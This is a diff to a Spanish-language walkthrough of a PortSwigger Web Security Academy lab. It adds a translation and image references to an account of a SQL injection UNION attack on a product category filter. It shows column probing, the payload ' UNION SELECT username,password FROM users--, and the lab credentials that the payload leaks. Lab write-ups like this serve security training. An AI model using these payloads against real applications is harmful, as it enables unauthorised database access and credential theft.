@@ -8,15 +8,31 @@ The database contains a different table called users, with columns called userna
 
 To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
 
+## Traducción al Español
+
+**Lab: SQL injection UNION attack, retrieving data from other tables**
+
+Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puedes usar un ataque UNION para recuperar datos de otras tablas. Para construir este tipo de ataque, necesitas combinar algunas de las técnicas que aprendiste en laboratorios anteriores.
+
+La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`.
+
+Para resolver el laboratorio, realiza un ataque de inyección SQL UNION que recupere todos los nombres de usuario y contraseñas, y utiliza la información para iniciar sesión como el usuario `administrator`.
+
 Le damos a abrir lab y nos abre una página con la url: https://0a0f002d03318553802aa37c00ea00aa.web-security-academy.net/
 
-La página web tiene el aspecto de la imagen 1. 
+La página web tiene el aspecto de la imagen 1.
+
+![Imagen 1 - Página principal del laboratorio](imagenes/imagen1.png)
+
+**Referencia a la imagen 1:** Vista inicial de la tienda vulnerable antes de comenzar la explotación.
 
 Una vez dentro, abrimos burpsuitepro y en el navegador activamos el FoxyProxy para que en el HTTP History vayan apareciendo las distintas Requests mientras navegamos por la página. Como ya nos da pistas la descripción del laboratorio, vamos a hacer el mismo de proceso de SQL injection UNION.
 
 Para ello, nos vamos a la categoria de Tech+gifts => https://0a0f002d03318553802aa37c00ea00aa.web-security-academy.net/filter?category=Tech+gifts
 
 Y desde burpsuite enviamos dicha petición al Repeater:
+
+```http
 GET /filter?category=Tech+gifts HTTP/2
 Host: 0a0f002d03318553802aa37c00ea00aa.web-security-academy.net
 Cookie: session=SDcZvX3ArVTosKWss0m7Ro07d08khhZA
@@ -32,6 +48,7 @@ Sec-Fetch-User: ?1
 Priority: u=0, i
 Te: trailers
 Connection: keep-alive
+```
 
 Y repetimos el mismo proceso de antes:
 ' ORDER BY 1--
@@ -51,12 +68,18 @@ Para ello probamos a meter esta consulta en el parámetro de antes, y probamos e
 ' UNION SELECT 'a',NULL--
 HTTP/2 200 OK
 
-SELECT NULL,'a'--
+' UNION SELECT NULL,'a'--
 HTTP/2 200 OK
 
 Ambos aceptan texto y vamos ahora a utilizar la pista del laboratorio para hacer la otra consulta y obtener la contraseña de administrador:
 that retrieves all usernames and passwords, and use the information to log in as the administrator
-user. 
+user.
+
+La carga útil final para extraer los datos de la tabla `users` sería:
+
+```sql
+' UNION SELECT username,password FROM users--
+```
 
 Y efectivamente nos filtra dichos usuarios de esa tabla:
 wiener
@@ -70,4 +93,12 @@ hch21lyqgsri8s0zrag3
 
 Ahora nos vamos a loguear con administrator para completar el laboratorio. Nos vamos a login y ponemos las credenciales: (imagen 2)
 
+![Imagen 2 - Login con el usuario administrator](imagenes/imagen2.png)
+
+**Referencia a la imagen 2:** Formulario de login usando las credenciales del usuario `administrator` obtenidas mediante la inyección SQL UNION.
+
 Laboratorio completado (imagen 3)
+
+![Imagen 3 - Laboratorio resuelto](imagenes/imagen3.png)
+
+**Referencia a la imagen 3:** Pantalla final que confirma que el laboratorio ha sido resuelto correctamente tras iniciar sesión como `administrator`.
